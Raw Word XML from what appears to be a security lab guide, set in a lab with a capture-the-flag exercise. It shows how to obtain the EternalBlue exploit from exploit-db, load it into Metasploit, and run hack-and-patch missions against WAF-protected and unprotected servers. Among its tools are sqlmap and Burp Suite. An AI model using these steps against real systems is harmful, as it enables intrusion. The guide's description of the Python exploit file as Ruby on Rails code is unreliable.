        <w:t xml:space="preserve">This process is a little more involved.  First you need to locate the exploits you want to download (or even write your own!).  The best database for this is at https://www.exploit-db.com/ for viewing the exploits but you can use the git tool grab specific items.  The </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>github</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> repository is located at </w:t>
      </w:r>
      <w:hyperlink r:id="rId24" w:history="1">
        <w:r w:rsidR="0016058D" w:rsidRPr="00C05730">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://github.com/offensive-security/exploit-database</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="0016058D">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24932A13" w14:textId="77777777" w:rsidR="00312E6B" w:rsidRDefault="00312E6B" w:rsidP="00312E6B">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">There is also a tool available on the git repository called </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>searchsploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> which will search the database for you and list the exploits for you.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CC1D4AC" w14:textId="5BF36426" w:rsidR="00312E6B" w:rsidRDefault="00312E6B" w:rsidP="00312E6B">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>To find a new Windows exploit, you can execute from the Kali server:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2355EC62" w14:textId="358FC909" w:rsidR="007801BC" w:rsidRDefault="007801BC" w:rsidP="00312E6B">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>On the Kali bash shell:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50137C92" w14:textId="77777777" w:rsidR="000374B3" w:rsidRDefault="000374B3" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
      </w:pPr>
      <w:r w:rsidRPr="000374B3">
        <w:t>git clone https://github.com/offensive-security/exploit-database.git /opt/exploit-database</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="722E42E0" w14:textId="0B8715F8" w:rsidR="000374B3" w:rsidRDefault="000374B3" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
      </w:pPr>
      <w:r>
        <w:t>cd /opt/exploit-database</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DD6F2DA" w14:textId="77777777" w:rsidR="00312E6B" w:rsidRDefault="00312E6B" w:rsidP="00312E6B">
      <w:pPr>
        <w:pStyle w:val="Note"/>
      </w:pPr>
      <w:r>
        <w:t>Say you want to find the exploit which works with the recent NSA Hacks released in May/June 2017, known as ‘</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>eternalblue</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>’ for SMB hacking:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A2F5C9B" w14:textId="77777777" w:rsidR="00312E6B" w:rsidRDefault="00312E6B" w:rsidP="00312E6B">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>./</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>searchsploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>eternalblue</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Windows</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76005DC1" w14:textId="77777777" w:rsidR="00312E6B" w:rsidRDefault="00312E6B" w:rsidP="00312E6B">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>{ a</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> list of exploits will be returned }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07199ED7" w14:textId="77777777" w:rsidR="00312E6B" w:rsidRDefault="00312E6B" w:rsidP="00312E6B">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Now you can choose which one you want to load, we will load the one for Windows 7/2008 or the file 42031.py.  Looking at the output of the command, you </w:t>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>will see that the files are in the platforms/win_x86-64/remote directory.  This file is the Ruby on Rails code that will be executed by Metasploit, and it will need to be copied to the proper folder.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CEF5CF8" w14:textId="77777777" w:rsidR="00312E6B" w:rsidRDefault="00312E6B" w:rsidP="00312E6B">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
      </w:pPr>
      <w:r>
        <w:t>cd ~</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>/.msf</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>4/modules</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05CE7F26" w14:textId="77777777" w:rsidR="00312E6B" w:rsidRDefault="00312E6B" w:rsidP="00312E6B">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
      </w:pPr>
      <w:r>
        <w:t>ls –ls</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DF07B64" w14:textId="77777777" w:rsidR="00312E6B" w:rsidRPr="00195492" w:rsidRDefault="00312E6B" w:rsidP="00312E6B">
      <w:pPr>
        <w:pStyle w:val="Note"/>
      </w:pPr>
      <w:r>
        <w:t>If the ‘exploits’ directory doesn’t exist, create it:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DBA9A12" w14:textId="77777777" w:rsidR="00312E6B" w:rsidRDefault="00312E6B" w:rsidP="00312E6B">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>mkdir</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> ~</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>/.msf</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>4/modules/exploits</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AB59036" w14:textId="77777777" w:rsidR="00312E6B" w:rsidRDefault="00312E6B" w:rsidP="00312E6B">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
      </w:pPr>
      <w:r>
        <w:t>cd exploits</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="126A4235" w14:textId="77777777" w:rsidR="00312E6B" w:rsidRDefault="00312E6B" w:rsidP="00312E6B">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>Do the same for the directory tree: win_86-64 and remote so you have the following directory structure:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="117AB5E3" w14:textId="77777777" w:rsidR="00312E6B" w:rsidRDefault="00312E6B" w:rsidP="00312E6B">
      <w:pPr>
        <w:pStyle w:val="Note"/>
      </w:pPr>
      <w:r w:rsidRPr="002B3278">
        <w:t>/root</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002B3278">
        <w:t>/.msf</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002B3278">
        <w:t>4/modules/exploits/win_x86-64/remote</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BA075A5" w14:textId="77777777" w:rsidR="00312E6B" w:rsidRDefault="00312E6B" w:rsidP="00312E6B">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>Now copy the Ruby files from the source location</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45CE0CEA" w14:textId="1A3D427B" w:rsidR="00312E6B" w:rsidRDefault="00312E6B" w:rsidP="00312E6B">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
        <w:rPr>
          <w:ins w:id="14" w:author="Peter Scheffler" w:date="2018-08-02T11:37:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>cp /</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="000374B3">
        <w:t>opt</w:t>
      </w:r>
      <w:r>
        <w:t>/exploit</w:t>
      </w:r>
      <w:r w:rsidR="00814419">
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t>database/platforms/win_x86-64/remote/42031.py .</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="3B2C3590" w14:textId="5827EB66" w:rsidR="004E3EBC" w:rsidRPr="004E3EBC" w:rsidRDefault="004E3EBC" w:rsidP="004E3EBC">
      <w:pPr>
        <w:pStyle w:val="Call-outQuote"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:rPrChange w:id="15" w:author="Peter Scheffler" w:date="2018-08-02T11:37:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:pPrChange w:id="16" w:author="Peter Scheffler" w:date="2018-08-02T11:37:00Z">
          <w:pPr>
            <w:pStyle w:val="TableGraphsource"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="17" w:author="Peter Scheffler" w:date="2018-08-02T11:37:00Z">
        <w:r w:rsidRPr="004E3EBC">
          <w:rPr>
            <w:b/>
            <w:color w:val="FF0000"/>
            <w:sz w:val="22"/>
            <w:szCs w:val="22"/>
            <w:rPrChange w:id="18" w:author="Peter Scheffler" w:date="2018-08-02T11:37:00Z">
              <w:rPr/>
            </w:rPrChange>
          </w:rPr>
          <w:t>Note that there is a period at the end of the previous line</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0CD23BE9" w14:textId="77777777" w:rsidR="00312E6B" w:rsidRDefault="00312E6B" w:rsidP="00312E6B">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>Now open Metasploit</w:t>
      </w:r>
      <w:bookmarkStart w:id="19" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="19"/>
    </w:p>
    <w:p w14:paraId="78511762" w14:textId="1756EFE1" w:rsidR="00312E6B" w:rsidRDefault="000374B3" w:rsidP="00312E6B">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>m</w:t>
      </w:r>
      <w:r w:rsidR="00312E6B">
        <w:t>sfconsole</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="59FAFE37" w14:textId="77777777" w:rsidR="00312E6B" w:rsidRDefault="00312E6B" w:rsidP="00312E6B">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>And search for the newly added exploit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CF76850" w14:textId="77777777" w:rsidR="00312E6B" w:rsidRDefault="00312E6B" w:rsidP="00312E6B">
      <w:pPr>
        <w:pStyle w:val="TableGraphsource"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">search </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>eternalblue</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="0A6980DC" w14:textId="77777777" w:rsidR="00312E6B" w:rsidRPr="00D629FA" w:rsidRDefault="00312E6B" w:rsidP="00312E6B">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>And the exploit will be displayed and is available for use.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65927C3D" w14:textId="77777777" w:rsidR="0016058D" w:rsidRDefault="0016058D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="231F20" w:themeColor="text1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="20D75F2B" w14:textId="00AB798D" w:rsidR="00B16A7C" w:rsidRDefault="00B16A7C">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="20" w:name="_Toc487296569"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Capture </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>The</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Flag</w:t>
      </w:r>
      <w:r w:rsidR="00F47D73">
        <w:t>:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="20"/>
    </w:p>
    <w:p w14:paraId="322601A4" w14:textId="7DC3340A" w:rsidR="00720D46" w:rsidRDefault="00720D46" w:rsidP="00720D46">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>It’s time for a game of Capture the flag where you will test your skills at both running and patching exploits.  The “Capture the Flag” server and scoreboard is located at</w:t>
      </w:r>
      <w:r w:rsidR="00760501">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId25" w:history="1">
        <w:r w:rsidR="00760501" w:rsidRPr="0049421E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://ctf.f5lab.biz</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00760501">
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  Please first visit the site to create a team name and have a look around.  To complete a challenge, enter in the Flag you receive when successfully running or patching an exploit.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27AAC94E" w14:textId="27305517" w:rsidR="00521D01" w:rsidRDefault="00521D01" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="21" w:name="_Toc487296570"/>
      <w:r>
        <w:t>Hack and Patch</w:t>
      </w:r>
      <w:bookmarkEnd w:id="21"/>
    </w:p>
    <w:p w14:paraId="4C58559B" w14:textId="652DC1ED" w:rsidR="00521D01" w:rsidRDefault="00521D01">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Note that each Mission is prefaced with [Hack] or [Patch].  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27759876" w14:textId="2412FBF7" w:rsidR="00521D01" w:rsidRDefault="00521D01" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Hacking</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="043D216F" w14:textId="66543273" w:rsidR="00521D01" w:rsidRDefault="00521D01">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">For the [Hack] missions, you will be attempting to run some sort of exploit.  Some will require knowledge of programming or some serious Google-foo to make work.  You MUST do these first </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>in order to</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> understand how the [Hack] works.  Also, you need to run the [Hack] missions against the “Unprotected” VIPs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47205439" w14:textId="742B8A6A" w:rsidR="00521D01" w:rsidRDefault="00521D01" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Patching</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="456A03F6" w14:textId="5FCE689A" w:rsidR="00521D01" w:rsidRDefault="00521D01">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>For the [Patch] missions, you need to rerun the same Hack you did in the corresponding mission but against the “Protected” VIP which has a special ASM policy attached.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C8FCC31" w14:textId="35BDBD71" w:rsidR="00521D01" w:rsidRDefault="00521D01" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="TableGraphtitle"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>***** Do not create your own ASM Policies *****</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B195890" w14:textId="446C7FAE" w:rsidR="00521D01" w:rsidRDefault="00521D01">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>The policies which are attached have been customized to integrate with our CTF API to show you the flags.</w:t>
      </w:r>
      <w:r w:rsidR="00762544">
        <w:t xml:space="preserve">  Each “Protected” VIP has an existing ASM Policy attached to it, please ensure that you modify the proper policy for the VIP when you are attempting to </w:t>
      </w:r>
      <w:r w:rsidR="003C78CE">
        <w:t>get the patch flag.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50360775" w14:textId="4F9195E8" w:rsidR="00521D01" w:rsidRDefault="00521D01" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="22" w:name="_Toc487296571"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Your First Hack and Patch</w:t>
      </w:r>
      <w:bookmarkEnd w:id="22"/>
    </w:p>
    <w:p w14:paraId="1F30B3BC" w14:textId="17FBE46C" w:rsidR="00521D01" w:rsidRDefault="00521D01">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>We will do the first one together… you’ll see how this works and we’re sure you will enjoy the rest of the class.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E4A3979" w14:textId="333A8E63" w:rsidR="00AD5676" w:rsidRDefault="00AD5676" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="23" w:name="_Toc487296572"/>
      <w:r>
        <w:t>Useful tools</w:t>
      </w:r>
      <w:bookmarkEnd w:id="23"/>
    </w:p>
    <w:p w14:paraId="68754221" w14:textId="76E0F0F3" w:rsidR="004C1FB8" w:rsidRPr="00FB4F2F" w:rsidRDefault="004C1FB8" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In order to complete the </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Capture</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> the Flag, you will need some tools to view the requests/responses and to complete the Hack missions.  Many of the tools you will need have been loaded onto the VMs you have access to.  Some of them are explained below:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F78800A" w14:textId="15C3C7F2" w:rsidR="004C1FB8" w:rsidRDefault="004C1FB8" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00FB4F2F">
        <w:t>SQLmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="308BCD32" w14:textId="38DDA818" w:rsidR="00AD5676" w:rsidRDefault="00AD5676" w:rsidP="00AD5676">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SQLmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00655A98">
        <w:rPr>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t xml:space="preserve"> is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and </w:t>
      </w:r>
      <w:r w:rsidRPr="00B13D41">
        <w:t>taking</w:t>
      </w:r>
      <w:r w:rsidRPr="00655A98">
        <w:rPr>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t xml:space="preserve">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 </w:t>
      </w:r>
      <w:r w:rsidR="004C1FB8">
        <w:rPr>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>Here is a l</w:t>
      </w:r>
      <w:r w:rsidRPr="00655A98">
        <w:rPr>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t xml:space="preserve">ink to the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00655A98">
        <w:rPr>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>sqlmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00655A98">
        <w:rPr>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t xml:space="preserve"> documentation: </w:t>
      </w:r>
      <w:hyperlink r:id="rId26" w:history="1">
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00655A98">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
          </w:rPr>
          <w:t>Sqlmap</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00655A98">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Helvetica Neue" w:hAnsi="Helvetica Neue"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
          </w:rPr>
          <w:t xml:space="preserve"> Website</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5B7A429A" w14:textId="6D454114" w:rsidR="004C1FB8" w:rsidRPr="00526315" w:rsidRDefault="004C1FB8">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00526315">
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:color w:val="252525"/>
          <w:u w:val="none"/>
        </w:rPr>
        <w:t>SQLmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00526315">
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:color w:val="252525"/>
          <w:u w:val="none"/>
        </w:rPr>
        <w:t xml:space="preserve"> is installed on the Kali Linux server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74093C45" w14:textId="3152CCB4" w:rsidR="004C1FB8" w:rsidRDefault="004C1FB8" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:t>Burp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00526315">
        <w:t>Suite</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E4BC2EA" w14:textId="5659DC3E" w:rsidR="00AD5676" w:rsidRPr="00526315" w:rsidRDefault="00AD5676" w:rsidP="00AD5676">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
        <w:rPr>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00526315">
        <w:rPr>
          <w:b/>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>Burp Suite</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>let’s</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t xml:space="preserve"> you review/edit the data send and received among other things.  It functions as a proxy, typically configured to listen on 127.0.01 loopback address.  An </w:t>
      </w:r>
      <w:r w:rsidRPr="00B13D41">
        <w:t>application</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t xml:space="preserve"> such as a web</w:t>
      </w:r>
      <w:r w:rsidR="004C1FB8">
        <w:rPr>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>broswer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>sqlmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t xml:space="preserve"> is configured to use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>Burpsuite</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t xml:space="preserve"> as a Proxy. This enable</w:t>
      </w:r>
      <w:r w:rsidR="004C1FB8">
        <w:rPr>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:shd w:val="clear" w:color="auto" w:fill="FAFAFA"/>
        </w:rPr>
        <w:t xml:space="preserve"> the review/editing of what is transmitted and received. </w:t>
      </w:r>
      <w:r w:rsidR="004C1FB8">
        <w:t>Here is a l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ink to </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Burpsuite</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> downloads and documentation</w:t>
      </w:r>
      <w:r w:rsidRPr="000E57FC">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId27" w:history="1">
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>BurpSuite</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F4459B5" w14:textId="0FE58B93" w:rsidR="004C1FB8" w:rsidRDefault="004C1FB8">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Burpsuite</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> is installed on the Windows 7 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
